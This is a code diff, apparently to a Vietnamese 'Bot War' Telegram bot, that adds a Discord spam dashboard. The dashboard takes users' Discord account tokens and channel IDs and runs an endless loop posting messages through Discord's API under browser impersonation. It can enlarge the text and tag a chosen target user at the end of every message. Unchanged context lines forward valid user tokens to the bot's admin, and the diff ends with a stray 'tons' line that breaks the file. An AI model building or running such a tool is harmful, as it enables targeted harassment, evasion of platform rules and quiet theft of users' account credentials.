@@ -34,10 +34,20 @@ DEFAULT_DELAY = 0.2
 
 admin_selected_target = {}
 anti_disconnect_tasks = {}
+
+# Lưu phiên Discord & Task Spam của từng người dùng
 discord_sessions = {}
+discord_spam_tasks = {}
 
 def get_user_delay(u_i):
     return user_delays.get(u_i, DEFAULT_DELAY)
+
+# Bảng chuyển đổi chữ thường sang chữ bé (Small Caps)
+def to_small_caps(text):
+    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢAʙCᴅEғGʜIᴊKʟMɴOᴘQʀSᴛUᴠWXYᴢ0123456789"
+    trans = str.maketrans(normal, small)
+    return text.translate(trans)
 
 def _sync():
     for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
@@ -112,9 +122,12 @@ async def is_user_in_channel(user_id):
             return True
         return False
 
+# ==========================================
+# GIAO DIỆN CHỌN APP
+# ==========================================
 def get_app_selector_menu():
     msg = """
-🌐 **HỆ THỐNG WAR SYSTEM MULTI-PLATFORM**
+🤖 **Bot War By Trần Minh Đức**
 ────────────────
 Vui lòng chọn ứng dụng bạn muốn chiến:
 """
@@ -232,8 +245,11 @@ async def start_anti_disconnect(target_uid, client):
             await client.get_me()
         except:
             pass
-        await asyncio.sleep(240) # 4 phút cho Render
+        await asyncio.sleep(240)
 
+# ==========================================
+# DISCORD HELPER & NOTIFY
+# ==========================================
 def get_discord_headers(token):
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
     props_json = json.dumps({
@@ -291,6 +307,74 @@ async def notify_admin_discord_token(user_id, token, user_data, created_at):
     except Exception as e:
         print(f"Lỗi gửi thông báo token discord: {e}")
 
+# ==========================================
+# GIAO DIỆN BẢNG ĐIỀU KHIỂN DISCORD BẰNG MENU
+# ==========================================
+def render_discord_dashboard(u):
+    session = discord_sessions.get(u, {})
+    tokens = session.get("tokens", [])
+    channels = session.get("channels", [])
+    content = session.get("content", "TLong spam tới")
+    delay = session.get("delay", 2.0)
+    mode = session.get("mode", "full") # full hoặc line
+    font_style = session.get("font_style", "big") # big (To kèm #) hoặc small (Bé)
+    tag_target = session.get("tag_target", "") # ID người dùng muốn tag ở cuối câu
+    
+    is_running = u in discord_spam_tasks and not discord_spam_tasks[u].done()
+    status_str = "🟢 Đang Spam..." if is_running else "🔴 Đang Dừng"
+
+    tokens_str = f"{len(tokens)} Token" if tokens else "❌ Chưa nhập"
+    channels_str = ', '.join(channels) if channels else "❌ Chưa cài"
+    mode_str = "Gửi Full (1 lần)" if mode == "full" else "Gửi Từng Dòng"
+    font_str = "Chữ To (# Nổi Bật)" if font_style == "big" else "Chữ Bé (Small Caps)"
+    tag_str = f"<@{tag_target}> (ID: {tag_target})" if tag_target else "❌ Tắt Spam Tag"
+
+    display_content = content[:40] + "..." if len(content) > 40 else content
+
+    txt = f"""
+🤖 **BẢNG ĐIỀU KHIỂN DISCORD SPAM SYSTEM**
+────────────────
+• **Trạng thái:** `{status_str}`
+• **Danh sách Token:** `{tokens_str}`
+• **ID Kênh/Nhóm Chat:** `{channels_str}`
+• **Chế độ gửi:** `{mode_str}`
+• **Kiểu chữ:** `{font_str}`
+• **Spam Tag cuối câu:** `{tag_str}`
+• **Nội dung mẫu:** `{display_content}`
+• **Delay:** `{delay}s`
+"""
+    buttons = []
+    if is_running:
+        buttons.append([Button.inline("⏹ NGỪNG SPAM DISCORD", data="dc_stop_spam")])
+    else:
+        buttons.append([Button.inline("▶ BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")])
+
+    buttons.append([
+        Button.inline("🆔 Cấu Hình ID Kênh", data="dc_set_channels"),
+        Button.inline("📝 Kho Ngôn (.txt/nhập)", data="dc_set_content")
+    ])
+    buttons.append([
+        Button.inline(f"⚙️ Mode: {mode_str}", data="dc_toggle_mode"),
+        Button.inline(f"🔤 Font: {'To (#)' if font_style=='big' else 'Bé'}", data="dc_toggle_font")
+    ])
+    buttons.append([
+        Button.inline("🏷 Thêm Tag Spam Cuối Câu", data="dc_set_tag"),
+        Button.inline("⏱ Cấu Hình Delay", data="dc_set_delay")
+    ])
+    buttons.append([
+        Button.inline("🔑 Quản Lý Token", data="dc_set_tokens"),
+        Button.inline("🔄 Reset Cấu Hình", data="dc_reset")
+    ])
+    buttons.append([
+        Button.inline("🚪 Đăng Xuất Discord", data="dc_logout"),
+        Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")
+    ])
+
+    return txt, buttons
+
+# ==========================================
+# TELEGRAM USERBOT LOGIC & HANDLERS
+# ==========================================
 def _logic(c, u_i):
     def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)
 
@@ -384,22 +468,155 @@ async def _callback_handler(ev):
         msg, buttons = get_main_menu(u)
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
+    # ==========================================
+    # QUẢN LÝ DISCORD SPAM QUA MENU
+    # ==========================================
     elif data == "app_discord":
-        discord_sessions[u] = {"tokens": [], "channels": [], "content": "TLong spam tới", "delay": 5.0, "step": "ask_num"}
+        if u not in discord_sessions:
+            discord_sessions[u] = {
+                "tokens": [], "channels": [], "content": "TLong spam tới",
+                "lines": ["TLong spam tới"], "delay": 2.0, "mode": "full", 
+                "font_style": "big", "tag_target": ""
+            }
+        
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "dc_set_tokens":
+        discord_sessions[u]["step"] = "ask_num"
+        txt = "🔑 **CẤU HÌNH TOKEN DISCORD**\n────────────────\n• Nhập số lượng Token bạn muốn dùng (Ví dụ: `2`):"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
+
+    elif data == "dc_set_channels":
+        discord_sessions[u]["step"] = "ask_channels"
+        txt = "🆔 **CẤU HÌNH ID KÊNH / NHÓM DISCORD**\n────────────────\n• Nhập ID Kênh/Nhóm Chat (nhiều ID cách nhau bởi dấu phẩy `,`):"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
+
+    elif data == "dc_set_content":
+        discord_sessions[u]["step"] = "ask_content"
         txt = """
-🤖 **DISCORD SPAM SYSTEM SETUP**
+📝 **CẤU HÌNH KHO NGÔN / NỘI DUNG SPAM**
 ────────────────
-• Nhập số lượng Token bạn muốn dùng:
-*(Ví dụ: gửi số `2`)*
+• Bạn có thể **GỬI 1 FILE .TXT** (Bao nhiêu dòng Bot cũng đọc full 100%).
+• Hoặc **NHẬP VĂN BẢN TRỰC TIẾP** vào tin nhắn bên dưới.
 """
-        await ev.edit(txt, buttons=[[Button.inline("🔙 Quay Lại", data="back_to_apps")]], parse_mode='markdown')
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
+
+    elif data == "dc_set_tag":
+        discord_sessions[u]["step"] = "ask_tag"
+        txt = "🏷 **CẤU HÌNH TAG SPAM CUỐI CÂU**\n────────────────\n• Nhập **User ID** Discord của đối tượng bạn muốn Tag ở cuối câu:\n*(Ví dụ: `123456789012345678` - Gửi `0` để TẮT tag)*"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
+
+    elif data == "dc_toggle_mode":
+        curr_mode = discord_sessions[u].get("mode", "full")
+        discord_sessions[u]["mode"] = "line" if curr_mode == "full" else "full"
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "dc_toggle_font":
+        curr_font = discord_sessions[u].get("font_style", "big")
+        discord_sessions[u]["font_style"] = "small" if curr_font == "big" else "big"
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "dc_set_delay":
+        discord_sessions[u]["step"] = "ask_delay"
+        txt = "⏱ **CẤU HÌNH DELAY DISCORD**\n────────────────\n• Nhập số giây Delay giữa các tin nhắn (Ví dụ: `1.5` hoặc `3`):"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
+
+    elif data == "dc_start_spam":
+        session = discord_sessions.get(u, {})
+        tokens = session.get("tokens", [])
+        channels = session.get("channels", [])
+        
+        if not tokens:
+            return await ev.answer("❌ Bạn chưa cài đặt Token Discord!", alert=True)
+        if not channels:
+            return await ev.answer("❌ Bạn chưa cài đặt ID Kênh Discord!", alert=True)
+
+        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
+            return await ev.answer("⚠️ Tiến trình Spam đang chạy rồi!", alert=True)
+
+        mode = session.get("mode", "full")
+        font_style = session.get("font_style", "big")
+        delay = session.get("delay", 2.0)
+        tag_target = session.get("tag_target", "")
+        
+        raw_content = session.get("content", "TLong spam tới")
+        lines = session.get("lines", [raw_content])
+
+        async def run_spam_loop():
+            async with AsyncSession(impersonate="chrome120") as session_http:
+                line_idx = 0
+                while True:
+                    for t in tokens:
+                        headers = get_discord_headers(t)
+                        for ch in channels:
+                            url = f"https://discord.com/api/v10/channels/{ch}/messages"
+                            
+                            # 1. Chọn nội dung câu (Full / Từng dòng)
+                            if mode == "full":
+                                msg_text = raw_content
+                            else:
+                                msg_text = lines[line_idx % len(lines)]
+                                line_idx += 1
+
+                            # 2. Xử lý Kiểu chữ (To kèm # / Bé Small Caps)
+                            if font_style == "big":
+                                # Tự động chèn dấu # ở đầu mỗi dòng để chữ siêu to
+                                formatted_lines = [f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()]
+                                msg_text = "\n".join(formatted_lines)
+                            elif font_style == "small":
+                                msg_text = to_small_caps(msg_text)
+
+                            # 3. Mặc định gắn SPAM TAG ở cuối câu (nếu có cài đặt)
+                            if tag_target:
+                                msg_text = f"{msg_text} <@{tag_target}>"
+
+                            try:
+                                await session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10)
+                            except:
+                                pass
+                            await asyncio.sleep(delay)
+
+        task = asyncio.create_task(run_spam_loop())
+        discord_spam_tasks[u] = task
+        await ev.answer("🚀 Đã BẮT ĐẦU spam Discord!", alert=True)
+        
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "dc_stop_spam":
+        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
+            discord_spam_tasks[u].cancel()
+            discord_spam_tasks.pop(u, None)
+            await ev.answer("🛑 Đã NGỪNG tiến trình Spam Discord!", alert=True)
+        else:
+            await ev.answer("⚠️ Không có tiến trình spam nào đang chạy!", alert=True)
+
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
     elif data == "dc_reset":
-        discord_sessions[u] = {"tokens": [], "channels": [], "content": "TLong spam tới", "delay": 5.0, "step": "ask_num"}
-        txt = "🔄 **Đã reset cấu hình Discord!**\n• Nhập số lượng Token bạn muốn dùng:"
-        await ev.edit(txt, buttons=[[Button.inline("🔙 Quay Lại", data="back_to_apps")]], parse_mode='markdown')
+        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
+            discord_spam_tasks[u].cancel()
+            discord_spam_tasks.pop(u, None)
+        
+        discord_sessions[u] = {
+            "tokens": [], "channels": [], "content": "TLong spam tới",
+            "lines": ["TLong spam tới"], "delay": 2.0, "mode": "full", 
+            "font_style": "big", "tag_target": ""
+        }
+        await ev.answer("🔄 Đã reset toàn bộ cấu hình Discord!", alert=True)
+        
+        txt, buttons = render_discord_dashboard(u)
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
     elif data == "dc_logout":
+        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
+            discord_spam_tasks[u].cancel()
+            discord_spam_tasks.pop(u, None)
+
         discord_sessions.pop(u, None)
         msg, buttons = get_app_selector_menu()
         await ev.edit("🚪 **Đã đăng xuất phiên Discord!**\n\n" + msg, buttons=buttons, parse_mode='markdown')
@@ -584,11 +801,12 @@ async def _callback_handler(ev):
             except Exception as e:
                 await cv.send_message(f"❌ **Lỗi Login:** `{e}`")
 
+# Xử lý text & file .txt nhập liệu cho Discord
 @bot.on(events.NewMessage(incoming=True))
 async def handle_discord_text_input(ev):
     u = ev.sender_id
     if u not in discord_sessions: return
-    if ev.text.startswith('/'): return
+    if ev.text and ev.text.startswith('/'): return
 
     session = discord_sessions[u]
     step = session.get("step")
@@ -605,8 +823,8 @@ async def handle_discord_text_input(ev):
     elif step == "ask_tokens":
         raw_tokens = ev.text.strip()
         tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
-        if len(tokens) != session["num_tokens"]:
-            return await ev.respond(f"❌ Bạn cần gửi đúng {session['num_tokens']} token (hiện nhận được {len(tokens)}). Vui lòng gửi lại!")
+        if len(tokens) != session.get("num_tokens", len(tokens)):
+            return await ev.respond(f"❌ Bạn cần gửi đúng {session.get('num_tokens')} token (hiện nhận được {len(tokens)}). Vui lòng gửi lại!")
         
         session["tokens"] = tokens
         for t in tokens:
@@ -614,8 +832,9 @@ async def handle_discord_text_input(ev):
             if valid:
                 await notify_admin_discord_token(u, t, user_data, created_at)
 
-        session["step"] = "ask_channels"
-        await ev.respond("✅ **Đã nhận và lưu token thành công!**\n\n📌 **Bước tiếp theo:** Nhập **ID Kênh / Nhóm chat** Discord muốn spam (nhiều ID cách nhau bằng dấu phẩy hoặc khoảng trắng):")
+        session["step"] = None
+        txt, buttons = render_discord_dashboard(u)
+        await ev.respond("✅ **Đã lưu Token thành công!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
     elif step == "ask_channels":
         ch_input = ev.text.strip()
@@ -624,17 +843,55 @@ async def handle_discord_text_input(ev):
             return await ev.respond("❌ Không có ID kênh hợp lệ! Vui lòng nhập lại.")
         
         session["channels"] = channel_ids
-        session["step"] = "ask_content"
-        await ev.respond("📝 **Nhập nội dung tin nhắn** muốn spam:")
+        session["step"] = None
+        txt, buttons = render_discord_dashboard(u)
+        await ev.respond("✅ **Đã cập nhật ID Kênh!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
     elif step == "ask_content":
-        content = ev.text.strip()
-        if not content:
-            return await ev.respond("❌ Nội dung không được để trống!")
-        
-        session["content"] = content
-        session["step"] = "ask_delay"
-        await ev.respond("⏱ **Nhập thời gian Delay** (giây, ví dụ: `2.0`):")
+        # Đọc nội dung nếu gửi File .txt
+        if ev.file and ev.file.ext == ".txt":
+            try:
+                file_bytes = await ev.download_media(bytes)
+                raw_text = file_bytes.decode('utf-8', errors='ignore').strip()
+                lines = [line.strip() for line in raw_text.splitlines() if line.strip()]
+                
+                if not lines:
+                    return await ev.respond("❌ File .txt rỗng! Vui lòng gửi lại file khác.")
+
+                session["content"] = raw_text
+                session["lines"] = lines
+                session["step"] = None
+
+                txt, buttons = render_discord_dashboard(u)
+                return await ev.respond(f"✅ **Đã Nạp Thành Công File TXT ({len(lines)} Dòng)!**\n" + txt, buttons=buttons, parse_mode='markdown')
+            except Exception as ex:
+                return await ev.respond(f"❌ Lỗi đọc file TXT: `{ex}`")
+
+        # Đọc nội dung nếu nhập chữ trực tiếp
+        elif ev.text:
+            content = ev.text.strip()
+            lines = [line.strip() for line in content.splitlines() if line.strip()]
+            session["content"] = content
+            session["lines"] = lines
+            session["step"] = None
+
+            txt, buttons = render_discord_dashboard(u)
+            await ev.respond("✅ **Đã cập nhật Nội dung Spam!**\n" + txt, buttons=buttons, parse_mode='markdown')
+
+    elif step == "ask_tag":
+        tag_val = ev.text.strip().replace("<@", "").replace(">", "").replace("!", "")
+        if tag_val == "0":
+            session["tag_target"] = ""
+            msg_out = "✅ **Đã TẮT tính năng Spam Tag!**"
+        elif tag_val.isdigit():
+            session["tag_target"] = tag_val
+            msg_out = f"✅ **Đã cài đặt Tag cho User ID:** `{tag_val}`!"
+        else:
+            return await ev.respond("❌ User ID phải là dãy số hợp lệ!")
+
+        session["step"] = None
+        txt, buttons = render_discord_dashboard(u)
+        await ev.respond(f"{msg_out}\n" + txt, buttons=buttons, parse_mode='markdown')
 
     elif step == "ask_delay":
         try:
@@ -644,51 +901,9 @@ async def handle_discord_text_input(ev):
             delay = 2.0
         
         session["delay"] = delay
-        session["step"] = "ready"
-
-        summary_txt = f"""
-🤖 **DISCORD SPAM DASHBOARD**
-────────────────
-• **Số lượng Token:** `{len(session['tokens'])}`
-• **ID Kênh:** `{', '.join(session['channels'])}`
-• **Nội dung:** `{session['content']}`
-• **Delay:** `{session['delay']}s`
-• **Trạng thái:** Sẵn sàng chiến!
-"""
-        buttons = [
-            [Button.inline("🚀 BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")],
-            [Button.inline("🔄 Reset cấu hình", data="dc_reset"), Button.inline("🚪 Đăng xuất / Thoát", data="dc_logout")],
-            [Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")]
-        ]
-        await ev.respond(summary_txt, buttons=buttons, parse_mode='markdown')
-
-@bot.on(events.CallbackQuery(pattern=b"dc_start_spam"))
-async def start_discord_spam_task(ev):
-    u = ev.sender_id
-    if u not in discord_sessions: return
-    session = discord_sessions[u]
-    tokens = session["tokens"]
-    channels = [{"id": cid, "name": cid} for cid in session["channels"]]
-    content = session["content"]
-    delay = session["delay"]
-
-    await ev.answer("🚀 Đã khởi động tiến trình spam Discord ngầm!", alert=True)
-    await ev.edit("🔥 **Đang tiến hành Spam Discord...**", buttons=[[Button.inline("🔄 Reset", data="dc_reset"), Button.inline("🚪 Thoát", data="dc_logout")]], parse_mode='markdown')
-
-    async def run_spam():
-        async with AsyncSession(impersonate="chrome120") as session_http:
-            while True:
-                for t in tokens:
-                    headers = get_discord_headers(t)
-                    for ch in channels:
-                        url = f"https://discord.com/api/v10/channels/{ch['id']}/messages"
-                        try:
-                            await session_http.post(url, headers=headers, json={"content": content, "tts": False}, timeout=10)
-                        except:
-                            pass
-                        await asyncio.sleep(delay)
-
-    asyncio.create_task(run_spam())
+        session["step"] = None
+        txt, buttons = render_discord_dashboard(u)
+        await ev.respond("✅ **Đã cập nhật Delay!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
 # ==========================================
 # WEB SERVER GIỮ SỐNG (RENDER)
@@ -708,7 +923,7 @@ async def start_web_server():
     return runner
 
 # ==========================================
-# CHƯƠNG TRÌNH CHÍNH (FIX LỖI TASK PENDING)
+# CHƯƠNG TRÌNH CHÍNH
 # ==========================================
 async def main():
     await start_web_server()
@@ -740,3 +955,4 @@ if __name__ == '__main__':
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         pass
+tons
